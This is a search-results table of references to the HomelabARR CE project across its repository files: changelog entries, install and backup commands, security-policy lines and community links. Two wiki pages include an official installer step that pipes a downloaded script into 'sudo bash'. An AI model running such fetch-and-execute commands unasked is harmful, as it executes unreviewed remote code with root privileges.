| `CHANGELOG.md` | 1 x | `- **Login limiter no longer counts successful logins** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209),` |
| `CHANGELOG.md` | 1 x | `- **MFA tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-214, [#297](https://github.com/im` |
| `CHANGELOG.md` | 1 x | `- **Mutation pass on the high-risk security core** (Epic [HLCE-261](https://mjashley.atlassian.net/browse/HLCE-261), HLC` |
| `CHANGELOG.md` | 1 x | `- **Mutation-testing harness (StrykerJS) + scoped baseline** (Epic [HLCE-261](https://mjashley.atlassian.net/browse/HLCE` |
| `CHANGELOG.md` | 1 x | `- **Nightly mutation-testing CI + per-module score ratchet** (Epic [HLCE-261](https://mjashley.atlassian.net/browse/HLCE` |
| `CHANGELOG.md` | 1 x | `- **Other deps**: 'dockerode' 4 → 5, 'better-sqlite3' 12.11.1, 'nodemailer' 8 → 9, '@types/node' 26, dev-tools group` |
| `CHANGELOG.md` | 1 x | `- **Persistence-integrity tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-221, [#301](htt` |
| `CHANGELOG.md` | 1 x | `- **Playwright E2E: seeded container target + critical-journey suite** (Epic [HLCE-209](https://mjashley.atlassian.net/b` |
| `CHANGELOG.md` | 1 x | `- **Rate-limit & lockout tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-215, [#299](http` |
| `CHANGELOG.md` | 1 x | `- **React 18 → 19**: upgraded 'react', 'react-dom', '@types/react', '@types/react-dom' to 19.2.7 (matched majors). Res` |
| `CHANGELOG.md` | 1 x | `- **React contexts & hooks tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-223, [#306](ht` |
| `CHANGELOG.md` | 1 x | `- **Read-only template volumes**: Temp deploy YAMLs now write to 'server/data/' instead of next to the source YAML, so d` |
| `CHANGELOG.md` | 1 x | `- **SSE broadcast no longer skips a client after a failing one** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/` |
| `CHANGELOG.md` | 1 x | `- **Security-invariant regression suite — permanent guardrails** (Epic [HLCE-209](https://mjashley.atlassian.net/brows` |
| `CHANGELOG.md` | 1 x | `- **Untested-route integration tests + a surfaced Router() bug fixed** (Epic [HLCE-270](https://mjashley.atlassian.net/b` |
| `CHANGELOG.md` | 1 x | `- **Wiki cleanup**: Removed Professional Edition section; replaced placeholder octopus with optimized v3b WebP at proper` |
| `CHANGELOG.md` | 1 x | `- **Workflow permissions**: Added explicit 'permissions: contents: read' to all workflows missing it. Resolves CodeQL al` |
| `CHANGELOG.md` | 1 x | `- **'POST /deploy' outer catch is unreachable — dead status branches removed** (Epic [HLCE-286](https://mjashley.atlas` |
| `CHANGELOG.md` | 1 x | `- **lucide-react 0.344 → 1.21**: required for React 19 peer support (the old range hard-blocked installs). Brand icons` |
| `CHANGELOG.md` | 1 x | `- **npm vulnerabilities patched**: vite, hono, @hono/node-server bumped to address 9 advisories (3 high, 6 moderate). ([` |
| `CHANGELOG.md` | 1 x | `- **react-hooks v7 architectural rules enforced as errors** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-` |
| `CHANGELOG.md` | 1 x | `- **shadcn/ui modernization**: converted all 83 'React.forwardRef' wrappers across 16 'src/components/ui/*' components t` |
| `CHANGELOG.md` | 1 x | `If you pulled a 'homelabarr-backend' image built between **26 July and 10 August 2026**, it crash-looped on startup and ` |
| `CONTRIBUTING.md` | 1 x | `- **Discord**: [discord.gg/Pc7mXX786x](https://discord.gg/Pc7mXX786x)` |
| `CONTRIBUTING.md` | 1 x | `- **Discussions**: [GitHub Discussions](https://github.com/imogenlabs/homelabarr-ce/discussions)` |
| `CONTRIBUTING.md` | 1 x | `- **Ko-fi**: [ko-fi.com/homelabarr](https://ko-fi.com/homelabarr)` |
| `CONTRIBUTING.md` | 1 x | `- **Reddit**: [r/homelabarr](https://reddit.com/r/homelabarr)` |
| `CONTRIBUTING.md` | 1 x | `- Open a [GitHub Issue](https://github.com/imogenlabs/homelabarr-ce/issues)` |
| `CONTRIBUTING.md` | 1 x | `- Or drop it in [#help](https://discord.gg/Pc7mXX786x) on Discord` |
| `CONTRIBUTING.md` | 1 x | `1. **Ideas start in Discord** — Drop suggestions in [#feature-requests](https://discord.gg/Pc7mXX786x) or open a [GitH` |
| `CONTRIBUTING.md` | 1 x | `\| 'dev' \| Active development — proposed changes \| [ce-dev.homelabarr.com](https://ce-dev.homelabarr.com) \| May bre` |
| `CONTRIBUTING.md` | 1 x | `\| 'main' \| Production — stable, released \| [demo.homelabarr.com](https://demo.homelabarr.com) \| Safe to run \|` |
| `CONTRIBUTING.md` | 1 x | `\| 'staging' \| Release candidate — 1 week community soak \| [ce-staging.homelabarr.com](https://ce-staging.homelabarr` |
| `README.md` | 1 x | `        <img src="https://github.com/imogenlabs/homelabarr-ce/actions/workflows/docker-build-push.yml/badge.svg" alt="Do` |
| `README.md` | 1 x | `        <img src="https://github.com/imogenlabs/homelabarr-ce/actions/workflows/security-audit.yml/badge.svg" alt="Secur` |
| `README.md` | 1 x | `        <img src="https://img.shields.io/badge/Reddit-r/homelabarr-FF4500?logo=reddit&logoColor=white" alt="Reddit">` |
| `README.md` | 1 x | `        <img src="https://img.shields.io/badge/Website-homelabarr.com-FF8C1A?logo=firefox&logoColor=white" alt="HomelabA` |
| `README.md` | 1 x | `        <img src="https://img.shields.io/github/v/release/imogenlabs/homelabarr-ce?label=Release&logo=github" alt="Relea` |
| `README.md` | 1 x | `    <a href="https://demo.homelabarr.com">` |
| `README.md` | 1 x | `    <a href="https://discord.gg/Pc7mXX786x">` |
| `README.md` | 1 x | `    <a href="https://github.com/imogenlabs/homelabarr-ce">` |
| `README.md` | 1 x | `    <a href="https://github.com/imogenlabs/homelabarr-ce/actions/workflows/docker-build-push.yml">` |
| `README.md` | 1 x | `    <a href="https://github.com/imogenlabs/homelabarr-ce/actions/workflows/security-audit.yml">` |
| `README.md` | 1 x | `    <a href="https://github.com/imogenlabs/homelabarr-ce/blob/main/LICENSE">` |
| `README.md` | 1 x | `    <a href="https://github.com/imogenlabs/homelabarr-ce/releases/latest">` |
| `README.md` | 1 x | `    <a href="https://homelabarr.com">` |
| `README.md` | 1 x | `    <a href="https://wiki.homelabarr.com">` |
| `README.md` | 1 x | `    <a href="https://www.reddit.com/r/homelabarr/">` |
| `README.md` | 1 x | `2. **Verify image signatures:** 'cosign verify --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-` |
| `README.md` | 1 x | `4. **Start the stack:** 'docker compose -f homelabarr.yml up -d'` |
| `README.md` | 1 x | `> **For a permanent setup**, move 'CORS_ORIGIN' into a '.env' file. See the [configuration docs](https://wiki.homelabarr` |
| `README.md` | 1 x | `All options: [wiki.homelabarr.com/guides/configuration](https://wiki.homelabarr.com/guides/configuration/)` |
| `README.md` | 1 x | `Don't want to install anything yet? [**Open the live demo →**](https://demo.homelabarr.com)` |
| `README.md` | 1 x | `Want the deep dive? [Architecture docs →](https://wiki.homelabarr.com/guides/architecture/)` |
| `README.md` | 1 x | `Want to build from source? See the [full install guide](https://wiki.homelabarr.com/guides/quick-start/).` |
| `README.md` | 1 x | `cd /opt/homelabarr` |
| `README.md` | 1 x | `docker compose -f homelabarr.yml up -d` |
| `README.md` | 1 x | `git clone https://github.com/imogenlabs/homelabarr-ce.git /opt/homelabarr` |
| `README.md` | 1 x | `homelabarr-ce/` |
| `README.md` | 1 x | `\| **Demo** \| [demo.homelabarr.com](https://demo.homelabarr.com) — log in with admin / admin \|` |
| `README.md` | 1 x | `\| **Disclosure** \| [SECURITY.md](SECURITY.md) + [/.well-known/security.txt](https://demo.homelabarr.com/.well-known/se` |
| `README.md` | 1 x | `\| **Discord** \| [discord.gg/Pc7mXX786x](https://discord.gg/Pc7mXX786x) \|` |
| `README.md` | 1 x | `\| **Docs** \| [wiki.homelabarr.com](https://wiki.homelabarr.com) \|` |
| `README.md` | 1 x | `\| **Reddit** \| [r/homelabarr](https://www.reddit.com/r/homelabarr/) \|` |
| `README.md` | 1 x | `\| **Security** \| [SECURITY.md](SECURITY.md) · [/.well-known/security.txt](https://demo.homelabarr.com/.well-known/sec` |
| `README.md` | 1 x | `\| **Website** \| [homelabarr.com](https://homelabarr.com) \|` |
| `README.md` | 1 x | `\| 'CLI_BRIDGE_HOST_PATH' \| Optional \| Host path mounted for CLI integration; defaults to '/opt/homelabarr'. \|` |
| `README.md` | 1 x | `├── homelabarr.yml    # Production Docker Compose` |
| `README.md` | 1 x | `├── wiki/             # Source for wiki.homelabarr.com (MkDocs)` |
| `SECURITY.md` | 1 x | `  --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `SECURITY.md` | 1 x | `  ghcr.io/imogenlabs/homelabarr-backend:<tag>` |
| `SECURITY.md` | 1 x | `  ghcr.io/imogenlabs/homelabarr-backend:<tag> \` |
| `SECURITY.md` | 1 x | `  ghcr.io/imogenlabs/homelabarr-backend:v2.3.0` |
| `SECURITY.md` | 1 x | `- Backend container runs as non-root user ('homelabarr:1001')` |
| `SECURITY.md` | 1 x | `- 'docker inspect homelabarr-backend' shows 'ReadonlyRootfs: true' and 'CapDrop: [ALL]'` |
| `SECURITY.md` | 1 x | `- https://demo.homelabarr.com/.well-known/security.txt (RFC 9116)` |
| `SECURITY.md` | 1 x | `Email **michael@mjashley.com** or open a [GitHub Security Advisory](https://github.com/imogenlabs/homelabarr-ce/security` |
| `SECURITY.md` | 1 x | `Traefik, frontend, backend, and socket-proxy all on the same Docker host. The 'homelabarr-internal' bridge network is th` |
| `SECURITY.md` | 1 x | `We will not pursue legal action against good-faith security research that limits testing to demo.homelabarr.com or your ` |
| `SECURITY.md` | 1 x | `cosign verify --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `SECURITY.md` | 1 x | `docker cp <backup.db> homelabarr-backend:/app/data/homelabarr.db` |
| `SECURITY.md` | 1 x | `git clone https://github.com/imogenlabs/homelabarr-ce && cd homelabarr-ce` |
| `SECURITY.md` | 1 x | `\| Latest release \| Yes — see [Releases](https://github.com/imogenlabs/homelabarr-ce/releases/latest) \|` |

## Wiki content

**337 references**

| File | Count | Match |
| ---- | ----- | ----- |
| `wiki/docs/CNAME` | 1 x | `wiki.homelabarr.com` |
| `wiki/docs/guides/api-reference.md` | 1 x | `**Base URL:** 'https://homelabarr.YOUR-DOMAIN/api/' (behind Traefik — recommended)` |
| `wiki/docs/guides/architecture.md` | 1 x | `homelabarr-data/        # Docker volume — HomelabARR settings (users, sessions)` |
| `wiki/docs/guides/cli-installation.md` | 1 x | `    You can [review the full script](https://github.com/imogenlabs/homelabarr-ce/blob/main/install-remote.sh) before run` |
| `wiki/docs/guides/cli-installation.md` | 1 x | `2. Download the HomelabARR repo to '/opt/homelabarr'` |
| `wiki/docs/guides/cli-installation.md` | 1 x | `cd /opt/homelabarr` |
| `wiki/docs/guides/cli-installation.md` | 1 x | `curl -fsSL https://raw.githubusercontent.com/imogenlabs/homelabarr-ce/main/install-remote.sh \| sudo bash` |
| `wiki/docs/guides/cli-installation.md` | 1 x | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/configuration.md` | 1 x | `- 'homelabarr-config' — user accounts, API keys, and sessions ('/app/server/config/')` |
| `wiki/docs/guides/configuration.md` | 1 x | `- 'homelabarr-data' — app data and logs` |
| `wiki/docs/guides/configuration.md` | 1 x | `All auth data is stored in '/app/server/config/' inside the backend container, persisted by the 'homelabarr-config' volu` |
| `wiki/docs/guides/configuration.md` | 1 x | `Instead of typing 'export' commands every time — which only last until you close your terminal — save your settings ` |
| `wiki/docs/guides/configuration.md` | 1 x | `docker compose -f homelabarr.yml --env-file .env up -d` |
| `wiki/docs/guides/configuration.md` | 1 x | `\| 'CLI_BRIDGE_HOST_PATH' \| '/opt/homelabarr' \| Path to the repo with app templates (must contain 'apps/') \|` |
| `wiki/docs/guides/contributing.md` | 1 x | `**☕ [Support on Ko-fi](https://ko-fi.com/homelabarr)** - Help fund development time, infrastructure costs, and project` |
| `wiki/docs/guides/contributing.md` | 1 x | `- **Discord**: [HomelabARR Community](https://discord.gg/Pc7mXX786x)` |
| `wiki/docs/guides/contributing.md` | 1 x | `- Report issues through [GitHub Issues](https://github.com/imogenlabs/homelabarr-ce/issues)` |
| `wiki/docs/guides/contributing.md` | 1 x | `We follow the [Contributor Covenant Code of Conduct](https://github.com/imogenlabs/homelabarr-ce/blob/main/.github/CODE_` |
| `wiki/docs/guides/contributing.md` | 1 x | `cd homelabarr-ce` |
| `wiki/docs/guides/contributing.md` | 1 x | `git clone https://github.com/YOUR_USERNAME/homelabarr-ce.git` |
| `wiki/docs/guides/contributing.md` | 1 x | `git remote add upstream https://github.com/imogenlabs/homelabarr-ce.git` |
| `wiki/docs/guides/faq.md` | 1 x | `- **HomelabARR settings** (users, sessions): 'homelabarr-data' Docker volume` |
| `wiki/docs/guides/faq.md` | 1 x | `- **[Discord](https://discord.gg/Pc7mXX786x)** — fastest, someone's usually around — ask in #help` |
| `wiki/docs/guides/faq.md` | 1 x | `- **[GitHub Discussions](https://github.com/imogenlabs/homelabarr-ce/discussions)** — questions and feature requests` |
| `wiki/docs/guides/faq.md` | 1 x | `- **[GitHub Issues](https://github.com/imogenlabs/homelabarr-ce/issues)** — bug reports` |
| `wiki/docs/guides/faq.md` | 1 x | `- **[homelabarr.com](https://homelabarr.com)** — product page` |
| `wiki/docs/guides/faq.md` | 1 x | `CE (Community Edition) is 100% free and open source under the MIT license. There's also a paid [HomelabARR Mobile](https` |
| `wiki/docs/guides/faq.md` | 1 x | `The shipped 'homelabarr.yml' already sets it. This affects you only if you wrote your own compose file or run your own p` |
| `wiki/docs/guides/faq.md` | 1 x | `docker compose -f homelabarr.yml pull` |
| `wiki/docs/guides/faq.md` | 3 x | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/faq.md` | 1 x | `docker compose -f homelabarr.yml up -d --force-recreate socket-proxy` |
| `wiki/docs/guides/faq.md` | 1 x | `git clone https://github.com/imogenlabs/homelabarr-ce.git /opt/homelabarr` |
| `wiki/docs/guides/faq.md` | 1 x | `sudo tar -czf homelabarr-backup-$(date +%Y%m%d).tar.gz /opt/appdata/` |
| `wiki/docs/guides/migration.md` | 1 x | `    ls -lh /opt/homelabarr-backup-*.tar.gz` |
| `wiki/docs/guides/migration.md` | 1 x | `    sudo tar czf /opt/homelabarr-backup-$(date +%Y%m%d).tar.gz /opt/appdata/` |
| `wiki/docs/guides/migration.md` | 1 x | `- **[Discord](https://discord.gg/Pc7mXX786x)** — Ask in #help, someone's usually around` |
| `wiki/docs/guides/migration.md` | 1 x | `- **[GitHub Discussions](https://github.com/imogenlabs/homelabarr-ce/discussions)** — For longer questions` |
| `wiki/docs/guides/migration.md` | 1 x | `cd /opt/homelabarr` |
| `wiki/docs/guides/migration.md` | 1 x | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/migration.md` | 1 x | `git clone https://github.com/imogenlabs/homelabarr-ce.git /opt/homelabarr` |
| `wiki/docs/guides/mobile-app.md` | 1 x | `- **Source:** [github.com/imogenlabs/homelabarr-mobile](https://github.com/imogenlabs/homelabarr-mobile)` |
| `wiki/docs/guides/mobile-app.md` | 1 x | `- **URL:** 'https://demo.homelabarr.com'` |
| `wiki/docs/guides/mobile-app.md` | 1 x | `- Is your CE server running? Check: 'docker ps \| grep homelabarr'` |
| `wiki/docs/guides/mobile-app.md` | 1 x | `\| **Build from source** \| Always free \| [github.com/imogenlabs/homelabarr-mobile](https://github.com/imogenlabs/homel` |
| `wiki/docs/guides/mobile-app.md` | 1 x | `\| Cloudflare Tunnel \| 'https://homelabarr.yourdomain.com' \|` |
| `wiki/docs/guides/mobile-app.md` | 1 x | `\| Traefik + domain \| 'https://homelabarr.yourdomain.com' \|` |
| `wiki/docs/guides/quick-start.md` | 1 x | `    You can [review the script](https://github.com/imogenlabs/homelabarr-ce/blob/main/install-remote.sh) before running ` |
| `wiki/docs/guides/quick-start.md` | 1 x | `2. Clone the repo to '/opt/homelabarr'` |
| `wiki/docs/guides/quick-start.md` | 1 x | `This downloads the entire repo — including all 100+ app templates — to '/opt/homelabarr'. The 'apps/' folder inside ` |
| `wiki/docs/guides/quick-start.md` | 1 x | `cd /opt/homelabarr` |
| `wiki/docs/guides/quick-start.md` | 1 x | `curl -fsSL https://raw.githubusercontent.com/imogenlabs/homelabarr-ce/main/install-remote.sh \| sudo bash` |
| `wiki/docs/guides/quick-start.md` | 3 x | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/quick-start.md` | 1 x | `git clone https://github.com/imogenlabs/homelabarr-ce.git /opt/homelabarr` |
| `wiki/docs/guides/security.md` | 1 x | `- **Audit trail:** [docs/audit/](https://github.com/imogenlabs/homelabarr-ce/tree/main/docs/audit) — 18 rounds, 201+ f` |
| `wiki/docs/guides/security.md` | 1 x | `- **Compliance posture:** [compliance/](https://github.com/imogenlabs/homelabarr-ce/tree/main/compliance) — CIS Docker` |
| `wiki/docs/guides/security.md` | 1 x | `- **Dependency policy:** [docs/governance/dependency-update-policy.md](https://github.com/imogenlabs/homelabarr-ce/blob/` |
| `wiki/docs/guides/security.md` | 1 x | `- **GitHub:** [Security Advisories](https://github.com/imogenlabs/homelabarr-ce/security/advisories/new)` |
| `wiki/docs/guides/security.md` | 1 x | `- **Incident response:** [docs/ir/](https://github.com/imogenlabs/homelabarr-ce/tree/main/docs/ir) — 11 playbooks cove` |
| `wiki/docs/guides/security.md` | 1 x | `- **Machine-readable:** [/.well-known/security.txt](https://demo.homelabarr.com/.well-known/security.txt) (RFC 9116)` |
| `wiki/docs/guides/security.md` | 1 x | `- **Threat model:** [docs/threat-model/](https://github.com/imogenlabs/homelabarr-ce/tree/main/docs/threat-model) — as` |
| `wiki/docs/guides/security.md` | 1 x | `HomelabARR CE ships with a production-grade security envelope by default. This page summarizes the controls that are act` |
| `wiki/docs/img/diagrams/generate_diagrams.py` | 1 x | `        'https://homelabarr.YOUR-DOMAIN', color=FLOW, fs=14, sub_fs=10, sub_gap=0.02)` |
| `wiki/docs/img/diagrams/generate_diagrams.py` | 1 x | `    ax.text(0.17, 0.115, 'homelabarr-data', fontsize=8,` |
| `wiki/docs/img/diagrams/generate_diagrams.py` | 1 x | `    ax.text(0.5, 0.97, 'HOMELABARR CE  --  SYSTEM ARCHITECTURE',` |
| `wiki/docs/img/diagrams/generate_diagrams.py` | 1 x | `    ax.text(0.99, 0.015, 'homelabarr.com  \|  Imogen Labs',` |
| `wiki/docs/index.md` | 1 x | `- [Demo](https://demo.homelabarr.com) — Try it live (login: admin/admin)` |
| `wiki/docs/index.md` | 1 x | `- [Discord](https://discord.gg/Pc7mXX786x) — Get help, share your setup` |
| `wiki/docs/index.md` | 1 x | `- [GitHub](https://github.com/imogenlabs/homelabarr-ce)` |
| `wiki/docs/index.md` | 1 x | `- [HomelabARR](https://homelabarr.com) — Product home` |
| `wiki/docs/index.md` | 1 x | `cd /opt/homelabarr` |
| `wiki/docs/index.md` | 1 x | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/index.md` | 1 x | `git clone https://github.com/imogenlabs/homelabarr-ce.git /opt/homelabarr` |
| `wiki/docs/install/changelog.md` | 1 x | `- **Container delete/stop/restart**: Docker client was never passed to the CLI manager. All container operations now wor` |
| `wiki/docs/install/changelog.md` | 1 x | `- **Deploy progress stream**: SSE 'connected' event now includes the server-assigned 'clientId', fixing "Client not foun` |
| `wiki/docs/install/changelog.md` | 1 x | `- **Docker socket permissions**: Apps that mount 'docker.sock' (Portainer, etc.) now get 'group_add' injected at deploy ` |
| `wiki/docs/install/changelog.md` | 1 x | `- **Read-only template volumes**: Temp deploy YAMLs now write to 'server/data/' instead of next to the source YAML, so d` |
| `wiki/docs/install/changelog.md` | 1 x | `- **Wiki cleanup**: Removed Professional Edition section; replaced placeholder octopus with optimized v3b WebP at proper` |
| `wiki/docs/install/changelog.md` | 1 x | `- **Workflow permissions**: Added explicit 'permissions: contents: read' to all workflows missing it. Resolves CodeQL al` |
| `wiki/docs/install/changelog.md` | 1 x | `- **npm vulnerabilities patched**: vite, hono, @hono/node-server bumped to address 9 advisories (3 high, 6 moderate). ([` |
| `wiki/docs/install/changelog.md` | 1 x | `- Add OWNER-PUNCHLIST for project management by @smashingtags in #203` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-182: fix cosign verify identity (org migration smashingtags->imogenlabs) by @smashingtags in #229` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-182: revert cosign-installer to v3 (fix red build from #222) by @smashingtags in #228` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-183: fix vitest e2e exclusion + drop deprecated tsconfig baseUrl by @smashingtags in #230` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-184: manualChunks function form for Vite 8/rolldown (unblocks #227) by @smashingtags in #231` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-185: revert to GitHub-hosted (public repo = free minutes; self-hosted blocked for public) by @smashingtags in #23` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-185: run security/compliance CI suite on self-hosted runners by @smashingtags in #232` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-186: fix backend crash loop (path-to-regexp override vs Express 5) by @smashingtags in #234` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-187: fix DAST Baseline duplicate-artifact 409 by @smashingtags in #236` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-188: TruffleHog (CI) + Betterleaks (pre-commit) — drop license-blocked gitleaks-action by @smashingtags in #237` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-189: fix compose validation step (filter + --no-interpolate) + tubesync volume by @smashingtags in #239` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-189: fix compose-security-validation install (mkdir -p ~/.local/bin) by @smashingtags in #238` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-189: validate compose templates as YAML+services (runner-stable) by @smashingtags in #240` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-190: scope docker vuln scan to own images + fix multi-run SARIF by @smashingtags in #241` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-191: rewrite E2E suite to run the real product locally by @smashingtags in #242` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-192: stabilize E2E on CI (cold-hydration timeouts + docker-free harness) by @smashingtags in #244` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-194: migrate GHCR namespace + deploy wiring smashingtags → imogenlabs by @smashingtags in #285` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-195: build-push workflow manual-dispatch only (minutes out is permanent) by @smashingtags in #287` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-197: add CodeQL SAST workflow by @smashingtags in #288` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-199: React 18 → 19 upgrade (core bump + forwardRef modernization) by @smashingtags in #273` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-199: documentation sweep for React 19 upgrade by @smashingtags in #280` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-199: fix broken wiki links (strict mkdocs build passes) by @smashingtags in #282` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-199: pages.yml → ubuntu-latest (unblock wiki publish) by @smashingtags in #289` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-202: nodemailer 9 regression test + React 19 changelog by @smashingtags in #278` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-202: roll up Dependabot deps + fix lucide-react React 19 peer by @smashingtags in #276` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-202: roll up remaining Dependabot PRs (radix transitive, dev-tools, nodemailer) by @smashingtags in #277` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-203: revert pages.yml to self-hosted (gitrunners fixed) by @smashingtags in #291` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-204: pages.yml on ubuntu-latest (public repo cannot use self-hosted runners) by @smashingtags in #293` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-209: CHANGELOG for Wave-2 auth + MFA tests (HLCE-212, HLCE-214) by @smashingtags in #298` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-210: test harness + Wave 1 unit tests (166 green) by @smashingtags in #294` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-211: Unit/coverage CI gate on ubuntu-latest with ratcheting floor by @smashingtags in #295` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-212: Unit tests for auth core (JWT, bcrypt, API keys, secrets) by @smashingtags in #296` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-214: Unit tests for MFA (TOTP + backup codes) by @smashingtags in #297` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-215: tests for rate-limit & account lockout by @smashingtags in #299` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-216: supertest integration tests for auth HTTP routes by @smashingtags in #300` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-217: audit hash-chain + secure-logging tests (audit/log/alert) by @smashingtags in #302` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-219: docker-manager tests (mocked dockerode) by @smashingtags in #304` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-220: deploy/SSE + startup-guard + network tests by @smashingtags in #305` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-221: persistence-integrity tests (db / stars / activity / loggers) by @smashingtags in #301` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-223: React contexts & hooks tests (AuthContext 100%) by @smashingtags in #306` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-225: high-value component tests (RTL) by @smashingtags in #307` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-226: Playwright E2E seeded target + critical journeys (and fix deploy 404) by @smashingtags in #316` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-227: Security-invariant regression suite (permanent guardrails) by @smashingtags in #309` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-228: Bug-lock regression — fix safeUrl / deployment.ts / cli-bridge appId by @smashingtags in #308` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-229: integration tests for dangerous ops (delete, deploy spawn, down -v) by @smashingtags in #310` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-254: enforce react-hooks v7 rules as errors by @smashingtags in #315` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-255: make login limiter's skipSuccessfulRequests effective by @smashingtags in #312` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-256: fix SQLCipher encryption-at-rest init (key before WAL) by @smashingtags in #303` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-257: frame audit row_hash with JSON to close boundary-ambiguous tamper by @smashingtags in #313` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-258: probe the Docker daemon instead of hardcoding healthy by @smashingtags in #314` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-259: fix SSE broadcast skipping a client after a failing one by @smashingtags in #311` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-260: README — E2E lanes + app count 117 by @smashingtags in #317` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-262: StrykerJS mutation-testing harness + scoped baseline by @smashingtags in #325` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-263: mutation pass on high-risk security modules (≥80% score) by @smashingtags in #332` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-264: nightly mutation-testing CI + per-module score ratchet by @smashingtags in #333` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-265: /health/detail 200→500 on internal error by @smashingtags in #318` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-266: validation path check case-insensitive on field key by @smashingtags in #319` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-267: validate container web port in all enhanced-mount handlers by @smashingtags in #321` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-268: unify password minimum length to 12 by @smashingtags in #320` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-269: detect audit-log tail truncation (chain tip) by @smashingtags in #322` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-271: integration tests for untested backend routes (+ Router() bug fix) by @smashingtags in #326` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-272: frontend security-component tests + lib/api gaps (+ password-min fix) by @smashingtags in #327` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-273: deploy-execution + backend-branch coverage (+ dead-code removal) by @smashingtags in #328` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-274: E2E round 2 — failure/permission/account journeys + harden (+ mount-wizard stub, bug fix) by @smashingtags` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-275: make GET /containers?stats=true non-blocking (async exec) by @smashingtags in #331` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-276: client port-conflict validation for text-typed catalog port fields by @smashingtags in #335` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-277: mutation pass on the dangerous-op routes (+ final coverage ratchet) by @smashingtags in #337` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-278: cover the remaining enhanced-mount route handlers by @smashingtags in #336` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-279: ratchet coverage floor + consolidated remediation CHANGELOG by @smashingtags in #344` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-280: frontend security fixes (rclone XSS, credential log, port validation) by @smashingtags in #338` |
